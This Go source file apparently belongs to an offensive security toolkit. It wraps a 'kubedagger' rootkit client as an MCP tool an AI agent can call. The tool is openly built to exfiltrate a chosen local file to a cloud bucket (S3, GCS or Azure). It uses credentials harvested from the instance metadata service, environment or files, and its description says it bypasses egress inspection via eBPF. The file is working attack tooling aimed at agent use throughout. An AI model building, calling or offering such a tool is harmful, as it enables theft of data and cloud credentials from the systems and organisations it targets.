package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type CloudExfilInput struct {
	Provider  string `json:"provider,omitempty"`
	Bucket    string `json:"bucket,omitempty"`
	Path      string `json:"path,omitempty"`
	CredsFrom string `json:"creds_from,omitempty"`
}

type CloudExfilTool struct {
	exec executor.Executor
}

func NewCloudExfil(exec executor.Executor) *CloudExfilTool {
	return &CloudExfilTool{exec: exec}
}

func (t *CloudExfilTool) Name() string { return "kubedagger_cloud_exfil" }

func (t *CloudExfilTool) Description() string {
	return "Exfiltrate a local file to cloud object storage (S3, GCS, Azure Blob) using credentials harvested from the instance. Uploads the file at the given path to the specified bucket, bypassing egress inspection via eBPF."
}

func (t *CloudExfilTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"provider": {
				"type": "string",
				"enum": ["aws", "gcp", "azure"],
				"description": "Cloud provider for the destination bucket (default: aws)"
			},
			"bucket": {
				"type": "string",
				"description": "Destination bucket name"
			},
			"path": {
				"type": "string",
				"description": "Local file path to exfiltrate"
			},
			"creds_from": {
				"type": "string",
				"enum": ["imds", "env", "file"],
				"description": "Where to obtain cloud credentials (default: imds)"
			}
		}
	}`)
}

func (t *CloudExfilTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CloudExfilInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Bucket, "bucket"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Path, "path"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"cloud", "exfil"}
	if input.Provider != "" {
		args = append(args, "--provider", input.Provider)
	}
	if input.Bucket != "" {
		args = append(args, "--bucket", input.Bucket)
	}
	if input.Path != "" {
		args = append(args, "--path", input.Path)
	}
	if input.CredsFrom != "" {
		args = append(args, "--creds-from", input.CredsFrom)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger cloud exfil failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	provider := input.Provider
	if provider == "" {
		provider = "aws"
	}
	fmt.Fprintf(&sb, "## KubeDagger Cloud Exfiltration: %s\n\n", provider)
	if output == "" {
		sb.WriteString("Exfiltration complete.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
